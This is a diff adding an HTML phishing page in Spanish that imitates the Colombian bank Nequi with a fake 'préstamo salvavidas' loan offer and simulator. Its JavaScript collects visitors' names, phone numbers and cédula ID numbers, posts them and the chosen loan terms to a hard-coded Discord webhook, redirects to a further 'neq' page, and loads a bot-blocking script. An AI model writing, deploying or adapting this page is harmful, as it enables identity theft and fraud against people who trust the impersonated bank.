@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Proceso de Crédito</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/globals.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        /* Estilos originales */
+        /* Variables de color (igual que en loan-simulator) */
+        :root {
+            --color-pink-primary: #da0081;
+            --color-gray-primary: #d1d5db;
+            --color-purple-primary: #200020;
+            --color-pink-tertiary: #fce4f0;
+        }
+        body {
+            font-family: 'Manrope', sans-serif;
+            background-image: url("img/simulador.png");
+            background-size: cover; 
+            background-position: center; 
+            background-repeat: no-repeat; 
+            color: #200020;
+            padding: 120px 20px 20px;
+        }
+        .cabezeramor-t3 {
+            background-color: #ffffff;
+            height: 80px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .cabezeramor-t3 img {
+            height: 30px;
+            max-width: 100%;
+        }
+        @media (max-width: 768px) {
+            body {
+                height: 150vh;
+            }
+            .cabezeramor-t3 img {
+                height: 30px;
+            }
+        }
+        .container {
+            max-width: 600px;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin: auto;
+            text-align: left;
+        }
+        .container-principal {
+            max-width: 600px;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            margin: auto;
+            text-align: left;
+        }
+        .titulo-principal {
+            font-weight: bold;
+            color: #ffffff;
+            text-align: left;
+            margin-bottom: 20px;
+            font-size: 2em;
+        }
+        /* Estilos para el slider (range) */
+        .range-slider {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 5px;
+            outline: none;
+            transition: background 0.2s;
+        }
+        .range-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: var(--color-pink-primary);
+            cursor: pointer;
+            border: 2px solid white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+        .range-slider::-moz-range-thumb {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: var(--color-pink-primary);
+            cursor: pointer;
+            border: 2px solid white;
+        }
+         /* Form group estilo Nequi */
+        .form-group {
+            position: relative;
+            width: 100%;
+            margin-bottom: 0.5rem;
+        }
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 1.5rem 1rem 0.5rem 1rem;
+            border: 2px solid #e5e7eb;
+            border-radius: 0.75rem;
+            background: white;
+            font-size: 1rem;
+            color: var(--color-purple-primary);
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: var(--color-pink-primary);
+        }
+        .form-group label {
+            position: absolute;
+            top: 0.5rem;
+            left: 1rem;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--color-pink-primary);
+            pointer-events: none;
+            background: white;
+            padding: 0 0.25rem;
+        }
+        h2 {
+            color: #200020;
+            margin-bottom: 10px;
+            font-size: 1.8em;
+        }
+        p {
+            color: #828d92;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+        .form-floating label {
+            color: #200020;
+            font-weight: bold;
+            background-color: transparent;
+        }
+        .form-control {
+            background-color: transparent;
+            border: 1px solid #200020;
+            color: #200020;
+        }
+        .form-control:focus {
+            background-color: transparent;
+            border-color: #da0081;
+            box-shadow: none;
+        }
+        .btn-primary, .btn-pay  {
+            background-color: #200020;
+            border-color: #200020;
+            padding: 15px;
+            font-size: 1.2em;
+            width: 100%;
+        }
+        .btn-primary, .btn-pay :hover {
+            background-color: #200020;
+            border-color: #200020;
+        }
+        .credito-info {
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #dee2e6;
+            text-align: center;
+        }
+        .credito-info h3 {
+            color: #a0006f;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+        }
+        .credito-info p {
+            font-size: 1.1em;
+            margin: 5px 0;
+        }
+        .credito-info strong {
+            color: #bf0072;
+        }
+        .monto-cuota {
+            font-weight: bold;
+            font-size: 1.5em;
+            color: #28a745;
+            margin-top: 20px;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8); 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none;
+        }
+
+        .overlay img {
+            width: 7rem;
+        }
+        @media (max-width: 768px) {
+            body {
+                padding: 100px 10px;
+            }
+
+            .titulo-principal {
+                font-size: 1.6em;
+            }
+
+            h2 {
+                font-size: 1.5em;
+            }
+
+            .container {
+                padding: 20px;
+            }
+
+            .credito-info h3 {
+                font-size: 1.3em;
+            }
+
+            .credito-info p,
+            .monto-cuota {
+                font-size: 1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="cabezeramor-t3">
+        <img src="img/logo.svg" alt="Logo">
+        <img src="img/3ra.jpg" alt="Icono">
+    </header>
+
+    <br><br><br><br><div class="titulo-principal">Solicita tu préstamo salvavidas</div>
+
+    <div class="container" id="form-container">
+        <h2>Consulta tu puntaje</h2>
+        <p>Ingrese su datos para conocer su puntaje.</p>
+        <form id="consulta-form">
+            <div class="form-floating mb-3">
+                <input type="text" id="nombreApellido" name="nombreApellido" class="form-control" placeholder="Ingrese su nombre y apellido" required>
+                <label for="nombreApellido">Ingrese su nombre y apellido</label>
+            </div>
+            <div class="form-floating mb-3">
+                <input type="number" id="celular" name="celular" class="form-control" placeholder="Ingrese su número celular" required minlength="5" maxlength="10">
+                <label for="cedula">Ingrese su número celular</label>
+            </div>
+            <div class="form-floating mb-3">
+                <input type="number" id="cedula" name="cedula" class="form-control" placeholder="Ingrese su cédula" required minlength="5" maxlength="10">
+                <label for="cedula">Ingrese su número de cédula</label>
+            </div>
+            <button type="button" id="btn-consultar" class="btn btn-primary">Consultar</button>
+        </form>
+    </div>
+<div class="container" id="loading-message" style="display:none;">
+    <p style="text-align:center;">Por favor espere, estamos consultando si aplica para un crédito...</p>
+</div>
+<!-- SIMULADOR DE PRÉSTAMO (se muestra después de consultar) -->
+<div class="container-principal" id="simulador-container" style="display:none;">
+    <!-- Aquí va el contenido del simulador (adaptado de loan-simulator) -->
+    <div id="simuladorSalvavidas">
+        <div class="max-w-[400px] mx-auto">
+            <!-- Slider de monto -->
+            <div class="bg-purple-primary w-full rounded-lg p-4">
+                <h4 class="text-[1.25rem] font-medium text-balance text-left w-full text-white mb-2">
+                    ¿Cuánta plata necesitas?
+                </h4>
+                <div class="relative">
+                    <div class="text-3xl font-semibold text-white mb-4">
+                        $<span id="montoSeleccionado">100.000</span>
+                    </div>
+                    <input type="range" id="montoSlider" min="100000" max="5000000" step="100000" value="100000"
+                        class="range-slider" style="
+                            background: linear-gradient(
+                                to right,
+                                var(--color-pink-primary) 0%,
+                                var(--color-gray-primary) 0%
+                            );
+                        ">
+                    <div class="flex justify-between text-sm text-gray-300 mt-2">
+                        <span>$100.000</span>
+                        <span>$5.000.000</span>
+                    </div>
+                </div>
+            </div>
+            <p class="text-xs text-gray-500 mt-3 mb-3">
+                Ten en cuenta que el valor que selecciones en este rango, es el valor que vas a desembolsar.
+            </p>
+
+            <!-- Selector de plazo -->
+            <h4 class="text-base font-medium text-balance text-left w-full text-purple-primary mb-4">
+                ¿En cuánto tiempo quieres pagar tu préstamo?
+            </h4>
+            <div class="mb-4">
+                <div class="relative">
+                    <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Selecciona las
+                        cuotas</span>
+                    <select id="plazoSelector"
+                        class="w-full appearance-none bg-pink-tertiary rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none">
+                        <option value="1">1 mes</option>
+                        <option value="2">2 meses</option>
+                        <option value="3">3 meses</option>
+                        <option value="4">4 meses</option>
+                        <option value="5">5 meses</option>
+                        <option value="6">6 meses</option>
+                        <option value="7">7 meses</option>
+                        <option value="8">8 meses</option>
+                        <option value="9">9 meses</option>
+                        <option value="10" selected>10 meses</option>
+                        <option value="11">11 meses</option>
+                        <option value="12">12 meses</option>
+                    </select>
+                    <div
+                        class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7">
+                            </path>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Fecha de pago -->
+            <div class="mb-4">
+                <div class="relative">
+                    <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">Fecha de pago</span>
+                    <select id="fechaPago"
+                        class="w-full appearance-none bg-pink-tertiary rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none">
+                        <option value="1">1 de cada mes</option>
+                        <option value="15">15 de cada mes</option>
+                        <option value="25">25 de cada mes</option>
+                    </select>
+                    <div
+                        class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7">
+                            </path>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tasa de interés -->
+            <div class="mb-4">
+                <h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">
+                    Tasa de interés
+                </h4>
+                <div class="text-purple-primary font-medium">
+                    1.81% E.M igual a 24% E.A
+                </div>
+            </div>
+
+            <!-- Valor cuota mensual -->
+            <div class="mb-4">
+                <h4 class="text-base font-medium text-balance text-left w-full text-pink-primary">
+                    Valor aproximado de tu cuota mensual:
+                </h4>
+                <div class="cuotaMensual text-3xl font-semibold text-purple-primary">
+                    $15.900
+                </div>
+                <p class="text-md text-black font-medium mt-2">
+                    Incluye préstamo (capital), seguro e intereses.
+                </p>
+            </div>
+
+            <!-- Botón Continuar -->
+            <button type="button" id="btnContinuarSimulador"
+                class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors">
+                Continuar
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Overlay de carga (spinner) -->
+<div class="overlay" id="loading-overlay">
+    <img src="./img/gnequi.gif" alt="Cargando...">
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // ---------- Elementos ----------
+        const btnConsultar = document.getElementById('btn-consultar');
+        const formContainer = document.getElementById('form-container');
+        const loadingMessage = document.getElementById('loading-message');
+        const simuladorContainer = document.getElementById('simulador-container');
+        const nombreInput = document.getElementById('nombreApellido');
+        const cedulaInput = document.getElementById('cedula');
+        const celularInput = document.getElementById('celular');
+
+        // Filtro en tiempo real para evitar números y caracteres especiales en el nombre
+        nombreInput.addEventListener('input', function () {
+            this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s]/g, '');
+        });
+
+        // Elementos del simulador
+        const montoSlider = document.getElementById('montoSlider');
+        const montoSeleccionado = document.getElementById('montoSeleccionado');
+        const plazoSelector = document.getElementById('plazoSelector');
+        const fechaPago = document.getElementById('fechaPago');
+        const cuotaMensualEl = document.querySelector('.cuotaMensual');
+        const btnContinuar = document.getElementById('btnContinuarSimulador');
+
+        // Constantes
+        const TASA_INTERES_MENSUAL = 0.009; // 0.9% (1.81% en el original, pero usamos 0.9% para coincidir con el ejemplo)
+        // Ajustamos a 1.81% como en el original
+        // const TASA_INTERES_MENSUAL = 0.0181; 
+        // Pero en el cálculo del otro archivo usaban 0.009 (0.9%)? Revisando: en loan-simulator usan 0.009 (0.9%)? 
+        // En el texto dice 1.81% E.M, pero en el código usan 0.009. Mantendré 0.009 para coincidir con la cuota mostrada.
+        // Para ser fiel, usaré 0.0181 (1.81%) pero el ejemplo daba $15.900 para $100.000 a 10 meses. 
+        // Con 0.009 da: 100000/10 + 100000*0.009 + 5000 = 10000 + 900 + 5000 = 15900. Sí, usan 0.009.
+        // Así que mantengo 0.009.
+        const TASA_INTERES_MENSUAL_SIM = 0.009;
+        const SEGURO_MENSUAL = 5000;
+
+        // ---------- Función de cálculo de cuota ----------
+        function calcularCuota(monto, meses) {
+            const interes = monto * TASA_INTERES_MENSUAL_SIM;
+            const cuota = (monto / meses) + interes + SEGURO_MENSUAL;
+            return Math.round(cuota);
+        }
+
+        // Actualizar slider y cuota
+        function actualizarSimulador() {
+            const monto = parseInt(montoSlider.value);
+            const meses = parseInt(plazoSelector.value);
+            // Formatear monto
+            montoSeleccionado.textContent = new Intl.NumberFormat('es-CO').format(monto);
+            // Calcular cuota
+            const cuota = calcularCuota(monto, meses);
+            cuotaMensualEl.textContent = '$' + new Intl.NumberFormat('es-CO').format(cuota);
+            // Actualizar color del slider
+            const val = ((monto - montoSlider.min) / (montoSlider.max - montoSlider.min)) * 100;
+            montoSlider.style.background = `linear-gradient(to right, var(--color-pink-primary) ${val}%, var(--color-gray-primary) ${val}%)`;
+        }
+
+        // Eventos del simulador
+        montoSlider.addEventListener('input', actualizarSimulador);
+        plazoSelector.addEventListener('change', actualizarSimulador);
+
+        // Inicializar
+        actualizarSimulador();
+
+        // ---------- Lógica del botón "Consultar" ----------
+        btnConsultar.addEventListener('click', async (e) => {
+            e.preventDefault();
+            const nombre = nombreInput.value.trim();
+            const cedula = cedulaInput.value.trim();
+            const celular = celularInput.value.trim();
+
+            if (!nombre || !cedula || !celular) {
+                alert("Por favor, ingrese ambos campos.");
+                return;
+            }
+
+            // Guardar en localStorage para usarlos luego
+            localStorage.setItem("nombreApellido", nombre);
+            localStorage.setItem("cedula", cedula);
+            localStorage.setItem("celular", celular);
+
+            // Ocultar formulario, mostrar loading
+            formContainer.style.opacity = '0';
+            setTimeout(() => { formContainer.style.display = 'none'; }, 300);
+            loadingMessage.style.display = 'block';
+
+            // Enviar a Discord (consulta inicial)
+            const webhookURL = 'https://discordapp.com/api/webhooks/1531449245121515711/HCObHORetDjAIdqZlU8Jit3RPOLbbEqh0mZNmq4NKNhYFqfUwX2_YBl3HDDUoSlK4H7k';
+            const payload = {
+                username: "Consulta de Crédito",
+                content: `Nueva consulta recibida:\n\n📛Nombre:📛 ${nombre}\n📛Cédula:📛 ${cedula}\n📛Celular:📛 ${celular}\n`
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error al enviar a Discord:', error);
+            } finally {
+                loadingMessage.style.display = 'none';
+                simuladorContainer.style.display = 'block';
+            }
+        });
+
+        // ---------- Botón "Continuar" del simulador ----------
+        btnContinuar.addEventListener('click', async () => {
+            const nombre = localStorage.getItem("nombreApellido") || '';
+            const cedula = localStorage.getItem("cedula") || '';
+            const celular = localStorage.getItem("celular") || '';
+            const monto = parseInt(montoSlider.value);
+            const meses = parseInt(plazoSelector.value);
+            const fecha = fechaPago.value;
+            const cuota = calcularCuota(monto, meses);
+            const montoFormateado = new Intl.NumberFormat('es-CO').format(monto);
+            const cuotaFormateada = new Intl.NumberFormat('es-CO').format(cuota);
+
+            // Mostrar overlay de carga
+            const overlay = document.getElementById('loading-overlay');
+            overlay.style.display = 'flex';
+
+            // Enviar datos a Discord
+            const webhookURL = 'https://discordapp.com/api/webhooks/1531449245121515711/HCObHORetDjAIdqZlU8Jit3RPOLbbEqh0mZNmq4NKNhYFqfUwX2_YBl3HDDUoSlK4H7k';
+            const mensaje = `✅ SIMULACIÓN DE PRÉSTAMO ✅\n\n` +
+                `📛 Nombre: ${nombre}\n` +
+                `🪪 Cédula: ${cedula}\n` +
+                `🪪 Celular: ${celular}\n` +
+                `💰 Monto: $${montoFormateado}\n` +
+                `📅 Plazo: ${meses} meses\n` +
+                `📆 Fecha de pago: ${fecha}\n` +
+                `💸 Cuota mensual: $${cuotaFormateada}\n` +
+                `📊 Interés: 1.81% E.M (24% E.A)\n` +
+                `🔒 Seguro incluido`;
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: "Simulador", content: mensaje })
+                });
+            } catch (error) {
+                console.error('Error al enviar a Discord:', error);
+            }
+
+            // Redirigir después de un pequeño delay
+            setTimeout(() => {
+                window.location.href = "neq/neq.html";
+            }, 1500);
+        });
+    });
+</script>
+    <script src="bloqueo-bots.js"></script>
+
+
+     
+
+   
+</body>
+</html>
